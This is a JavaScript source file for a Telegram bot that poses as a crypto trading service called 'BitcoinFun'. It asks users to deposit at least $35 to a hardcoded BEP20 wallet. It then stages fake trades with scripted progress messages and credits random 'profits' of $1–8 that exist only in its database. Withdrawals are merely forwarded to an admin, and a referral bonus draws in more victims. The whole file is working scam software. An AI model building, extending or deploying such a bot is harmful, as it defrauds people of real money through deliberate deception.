require("dotenv").config();
const { Telegraf, Markup, session } = require("telegraf");
const express = require("express");
const admin = require("firebase-admin");

const app = express();
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_ID);

// 🔒 HARDCODED BEP20 ADDRESS (as requested)
const BEP20_ADDRESS = "0x2784B4515D98C2a3Dbf59ebAAd741E708B6024ba";

// ---------------- FIREBASE ----------------
admin.initializeApp({
  credential: admin.credential.cert(
    JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT)
  ),
});
const db = admin.firestore();
const users = db.collection("users");

// ---------------- MIDDLEWARE ----------------
bot.use(session());

// ---------------- HELPERS ----------------
const userRef = (id) => users.doc(String(id));

async function getUser(uid, username = "") {
  const ref = userRef(uid);
  const snap = await ref.get();
  if (!snap.exists) {
    const data = {
      balance: 0,
      deposited: 0,
      referrals: 0,
      lastTrade: 0,
      tradesToday: 0,
      lastTradeDay: new Date().toDateString(),
      username,
    };
    await ref.set(data);
    return data;
  }
  const data = snap.data();
  const today = new Date().toDateString();
  if (data.lastTradeDay !== today) {
    data.tradesToday = 0;
    data.lastTradeDay = today;
    await ref.update({ tradesToday: 0, lastTradeDay: today });
  }
  return data;
}

// ---------------- START ----------------
bot.start(async (ctx) => {
  const uid = String(ctx.from.id);
  const refId = ctx.startPayload;
  const user = await getUser(uid, ctx.from.username || "");

  // referral bonus
  if (refId && refId !== uid) {
    const rRef = userRef(refId);
    const rSnap = await rRef.get();
    if (rSnap.exists) {
      await rRef.update({
        balance: admin.firestore.FieldValue.increment(10),
        referrals: admin.firestore.FieldValue.increment(1),
      });
      bot.telegram.sendMessage(
        refId,
        "🎉 *Referral Bonus!* You earned *$10*",
        { parse_mode: "Markdown" }
      );
    }
  }

  return ctx.reply(
    "🚀 *BitcoinFun™ Smart Liquidity Engine*\n\n" +
      "⚡ Institutional-grade execution\n" +
      "🌊 Smart liquidity pooling\n" +
      "🤖 Automated probability engine (LIVE)\n\n" +
      "💰 *Minimum Capital:* `$35`\n" +
      "⏱ 2 trades/day • 💸 Withdraw anytime\n\n" +
      "🔒 Secure • Fast • Exclusive\n\n" +
      "_Tap a button below to enter the system_ 👇",
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("➕ ADD CAPITAL ($35+)", "deposit")],
        [Markup.button.callback("📈 SMART TRADE (UP / DOWN)", "trade_menu")],
        [Markup.button.callback("💳 WITHDRAW PROFITS", "withdraw")],
        [Markup.button.callback("🆘 LIVE SUPPORT", "support")],
        [Markup.button.callback("🤝 REFER & EARN $10", "refer")],
      ]),
    }
  );
});

// ---------------- DEPOSIT ----------------
bot.action("deposit", async (ctx) => {
  await ctx.answerCbQuery(); // ⚡ instant
  ctx.session.mode = "deposit_amount";
  return ctx.reply(
    "💎 *Capital Injection Panel*\n\n" +
      "Send funds to the address below:\n\n" +
      `\`${BEP20_ADDRESS}\`\n\n` +
      "💰 Minimum: *$35*\n\n" +
      "_Enter amount to continue_",
    { parse_mode: "Markdown" }
  );
});

// ---------------- TRADE MENU ----------------
bot.action("trade_menu", async (ctx) => {
  await ctx.answerCbQuery(); // ⚡ instant
  return ctx.reply(
    "📊 *Smart Trade Panel*\n\nChoose market direction:",
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback("🟢 UP (BULLISH)", "trade_up"),
          Markup.button.callback("🔴 DOWN (BEARISH)", "trade_down"),
        ],
      ]),
    }
  );
});

// ---------------- TRADE EXEC ----------------
bot.action(["trade_up", "trade_down"], async (ctx) => {
  await ctx.answerCbQuery(); // ⚡ instant
  const uid = String(ctx.from.id);
  const ref = userRef(uid);
  const user = await getUser(uid);

  // ❌ lock if no deposit
  if (user.deposited < 35) {
    return ctx.reply(
      "🚫 *Trading Locked*\n\nActivate with a minimum *$35* deposit to unlock Smart Trades.",
      { parse_mode: "Markdown" }
    );
  }

  const now = Date.now();
  if (user.tradesToday >= 2 && now - user.lastTrade < 12 * 60 * 60 * 1000) {
    return ctx.reply("⏳ Cooldown active. Come back after 12 hours.");
  }

  await ref.update({
    lastTrade: now,
    tradesToday: admin.firestore.FieldValue.increment(1),
  });

  await ctx.reply("⚙️ Initializing smart contract…");
  setTimeout(() => ctx.reply("🌊 Liquidity pools connected…"), 4000);
  setTimeout(() => ctx.reply("🧠 Probability engine calculating outcome…"), 8000);

  setTimeout(async () => {
    const win = Math.floor(Math.random() * 8) + 1;
    await ref.update({
      balance: admin.firestore.FieldValue.increment(win),
    });
    ctx.reply(
      `✅ *TRADE EXECUTED*\n\n💸 Profit Added: *$${win}*\n\n🔁 Next cycle after 12 hours`,
      { parse_mode: "Markdown" }
    );
  }, 12000);
});

// ---------------- WITHDRAW ----------------
bot.action("withdraw", async (ctx) => {
  await ctx.answerCbQuery(); // ⚡ instant
  ctx.session.mode = "withdraw_amount";
  return ctx.reply(
    "💳 *Withdrawal Panel*\n\n" +
      "✔ Amount ≤ Deposited\n" +
      "✔ Network: BEP20 (BSC)\n\n" +
      "_Enter withdrawal amount_",
    { parse_mode: "Markdown" }
  );
});

// ---------------- SUPPORT ----------------
bot.action("support", async (ctx) => {
  await ctx.answerCbQuery(); // ⚡ instant
  ctx.session.mode = "support";
  return ctx.reply(
    "🆘 *Live Support*\n\nType your issue below.\n_Admin will personally review it._",
    { parse_mode: "Markdown" }
  );
});

// ---------------- REFERRAL ----------------
bot.action("refer", async (ctx) => {
  await ctx.answerCbQuery(); // ⚡ instant
  const me = await bot.telegram.getMe();
  const link = `https://t.me/${me.username}?start=${ctx.from.id}`;
  return ctx.reply(
    "🤝 *Referral Program*\n\nInvite friends & earn *$10* per referral.\n\n" +
      `🔗 ${link}`,
    { parse_mode: "Markdown" }
  );
});

// ---------------- TEXT HANDLER ----------------
bot.on("text", async (ctx) => {
  const uid = String(ctx.from.id);
  const user = await getUser(uid);

  // SUPPORT
  if (ctx.session?.mode === "support") {
    await bot.telegram.sendMessage(
      ADMIN_ID,
      `🆘 SUPPORT\nUser: ${uid}\nMessage: ${ctx.message.text}`
    );
    ctx.session.mode = null;
    return ctx.reply("✅ Support message sent to Admin.");
  }

  // DEPOSIT AMOUNT
  if (ctx.session?.mode === "deposit_amount") {
    const amt = Number(ctx.message.text);
    if (isNaN(amt) || amt < 35) {
      return ctx.reply("❌ Invalid amount. Minimum is $35.");
    }
    ctx.session.depositAmt = amt;
    ctx.session.mode = "deposit_proof";
    return ctx.reply("📸 Upload payment screenshot.");
  }

  // WITHDRAW AMOUNT
  if (ctx.session?.mode === "withdraw_amount") {
    const amt = Number(ctx.message.text);
    if (isNaN(amt) || amt > user.deposited || amt < 30) {
      return ctx.reply("❌ Invalid withdrawal amount.");
    }
    ctx.session.withdrawAmt = amt;
    ctx.session.mode = "withdraw_address";
    return ctx.reply("📥 Send your BEP20 wallet address:");
  }

  // WITHDRAW ADDRESS
  if (ctx.session?.mode === "withdraw_address") {
    await bot.telegram.sendMessage(
      ADMIN_ID,
      `💳 WITHDRAW REQUEST\nUser: ${uid}\nAmount: $${ctx.session.withdrawAmt}\nAddress: ${ctx.message.text}`
    );
    ctx.session.mode = null;
    return ctx.reply("⏳ Withdrawal request sent to Admin.");
  }
});

// ---------------- DEPOSIT PROOF ----------------
bot.on(["photo", "document"], async (ctx) => {
  if (ctx.session?.mode !== "deposit_proof") return;

  const fileId = ctx.message.photo
    ? ctx.message.photo.at(-1).file_id
    : ctx.message.document.file_id;

  await bot.telegram.sendPhoto(ADMIN_ID, fileId, {
    caption: `💰 DEPOSIT PROOF\nUser: ${ctx.from.id}\nAmount: $${ctx.session.depositAmt}`,
  });

  ctx.session.mode = null;
  return ctx.reply("⏳ Deposit proof sent to Admin for verification.");
});

// ---------------- SERVER ----------------
app.get("/", (_, res) => res.send("BitcoinFun Bot LIVE"));
app.listen(process.env.PORT || 3000, "0.0.0.0");

// ---------------- LAUNCH ----------------
bot.launch().then(() => console.log("🚀 BitcoinFun Bot LIVE"));